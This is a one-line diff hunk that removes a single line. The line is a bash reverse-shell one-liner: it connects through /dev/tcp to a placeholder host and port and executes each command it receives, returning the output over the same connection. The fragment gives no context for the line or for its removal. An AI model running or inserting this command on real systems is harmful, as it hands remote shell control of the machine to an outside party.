@@ -1,1 +1,0 @@
-bash -c 'exec 3<>/dev/tcp/*\host*/*\port*; cat <&3 | while read line; do $line 2>&3 >&3; done'
